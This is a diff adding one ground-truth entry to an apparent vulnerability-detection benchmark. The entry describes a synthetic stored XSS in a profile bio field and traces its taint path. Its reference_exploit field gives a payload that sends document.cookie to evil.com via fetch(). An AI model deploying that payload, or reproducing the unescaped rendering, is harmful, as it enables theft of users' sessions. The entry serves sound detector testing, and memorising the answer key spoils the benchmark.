@@ -1,0 +1,21 @@
+id: gt-036
+source_project: synthetic
+commit_hash: "synthetic-no-commit"
+cwe_id: CWE-79
+cwe_name: Cross-site Scripting (Stored)
+label: true_positive
+affected_files:
+  - eval/synthetic/xss-stored-db.ts
+line_numbers: [14, 22, 30]
+taint_source: req.body.bio
+taint_sink: "res.send() rendering unsanitized DB content"
+taint_path:
+  - "req.body.bio (POST /profile handler)"
+  - "await db.query('UPDATE users SET bio = $1 WHERE id = $2', [req.body.bio, userId])"
+  - "GET /profile/:id fetches bio from DB"
+  - "res.send(`<div class='bio'>${row.bio}</div>`) renders unsanitized stored value"
+complexity: inter
+exploitable: true
+reference_exploit: "POST /profile with bio=<img src=x onerror=fetch('https://evil.com/'+document.cookie)> steals cookies"
+reference_fix_commit: null
+notes: "Hand-crafted synthetic. Stored XSS: input is parameterized for SQL (safe from SQLi) but output is not HTML-escaped. Demonstrates that parameterization alone does not prevent XSS."
